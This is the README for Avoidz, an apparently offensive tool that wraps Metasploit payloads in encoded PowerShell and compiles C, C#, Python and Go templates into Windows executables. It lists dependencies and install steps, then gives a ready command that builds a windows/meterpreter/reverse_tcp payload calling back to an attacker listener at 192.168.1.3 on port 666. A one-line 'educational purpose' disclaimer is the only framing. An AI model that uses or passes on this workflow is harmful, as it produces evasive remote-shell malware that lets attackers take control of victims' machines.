## Avoidz v 1.3 
    Author: Mascerano Bachir [ dev-labs ]

## Legal Disclamer:
    The author does not hold any responsibility for the bad use of this tool,
    remember this is only for educational purpose.

## Description:
    This tool Generate encoded powershell with metasploit payloads,convert C, C#, py, go Templates to EXE's 
 
## Screenshot:
<img src="http://i.imgur.com/sTeiZyE.png" width="49.99%"></img> <img src="http://i.imgur.com/I0lIBDl.png" width="49.99%"></img> 

<br /><br />

## Dependencies :
	1 - xterm
	2 - metasploit-framework
	3 - MinGW32
	4 - Monodevelop
	5 - Wine
	6 - Python.exe v 2.7
	7 - Golang

## Download/Config/Usage:
    1º - Download the tool from github
            git clone https://github.com/M4sc3r4n0/avoidz.git

    2º - Set setup script execution permission
            cd avoidz
            chmod +x setup.sh

    3°- Run setup script
            sudo ./setup.sh == to check dependencies

    4°- Install rubygems:
           sudo gem install colorize
           sudo gem install artii
    
    5°- Run avoidz tool == example
           ./avoidz.rb == help command
           ./avoidz.rb -h 192.168.1.3 -p 666 -m windows/meterpreter/reverse_tcp -f c1 == generate

## video tutorial: 
Avoidz v 1.0 old method : https://www.youtube.com/watch?v=ZilOByKkrVk
